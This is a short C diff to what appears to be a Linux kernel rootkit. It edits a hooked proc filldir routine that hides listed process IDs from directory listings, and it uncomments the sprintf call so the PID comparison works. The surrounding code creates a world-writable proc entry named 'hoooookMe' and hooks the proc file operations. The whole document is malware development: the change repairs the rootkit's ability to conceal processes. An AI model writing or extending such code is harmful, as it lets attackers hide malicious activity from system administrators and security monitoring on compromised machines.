@@ -28,10 +28,10 @@ struct proc_dir_entry* proc;
 
 
 int hooked_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type){
-    char buf[2048]; // what's this for?
+    char buf[512];
     struct proc_to_hide* cur;
     for(cur = processes_to_hide; cur != 0; cur = cur->next){
-        // sprintf(buf, "%d", cur->pid);
+        sprintf(buf, "%d", cur->pid);
         if(strcmp(buf, name)==0){
             // OUR_DEBUG("Hiding pid %s \n", char_pids_to_hide[i]);
             return 0;
@@ -52,7 +52,6 @@ void load_processhiding(void)
     const char *myname = "hoooookMe";
     struct file_operations *proc_fops;
     struct proc_dir_entry *key = create_proc_entry(myname, 0666, NULL);
-    struct proc_dir_entry *proc;
 
     proc = key->parent;
 
